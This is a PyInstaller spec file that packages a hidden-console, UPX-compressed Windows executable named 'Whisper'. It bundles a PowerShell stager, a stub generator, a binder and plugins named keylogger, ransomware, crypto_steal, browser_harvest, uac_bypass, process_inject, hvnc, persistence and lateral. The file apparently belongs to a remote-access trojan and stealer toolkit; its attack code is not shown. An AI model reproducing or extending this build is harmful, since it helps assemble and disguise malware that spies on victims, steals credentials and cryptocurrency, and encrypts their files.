# -*- mode: python ; coding: utf-8 -*-
"""PyInstaller spec for Whisper unified EXE."""
import sys, os, glob
from pathlib import Path

block_cipher = None

a = Analysis(
    ['whisper.py'],
    pathex=[],
    binaries=[],
    datas=[
        ('plugins/*.py', 'plugins'),
        ('stub_c.c', '.'),
        ('stager.ps1', '.'),
        ('agent.py', '.'),
    ],
    hiddenimports=[
        'server', 'builder', 'binder', 'web_server', 'stub_generator',
        'plugins', 'plugins.anti_vm', 'plugins.browser_harvest', 'plugins.clipboard',
        'plugins.core', 'plugins.crypto_clipper', 'plugins.crypto_steal',
        'plugins.dns_hijack', 'plugins.file_hunter', 'plugins.file_manager',
        'plugins.hvnc', 'plugins.keylogger', 'plugins.lateral', 'plugins.persistence',
        'plugins.process_inject', 'plugins.ransomware', 'plugins.screenshot',
        'plugins.shell', 'plugins.uac_bypass', 'plugins.vuln_scan',
        'plugins.webcam', 'plugins.wifi_harvest', 'plugins._helpers',
        'http.server', 'socketserver', 'urllib.parse', 'webbrowser',
        'email',
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[
        'tkinter.test', 'unittest', 'xml',
        'distutils', 'setuptools', 'pdb', 'doctest', 'venv',
    ],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='Whisper',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=None,
)
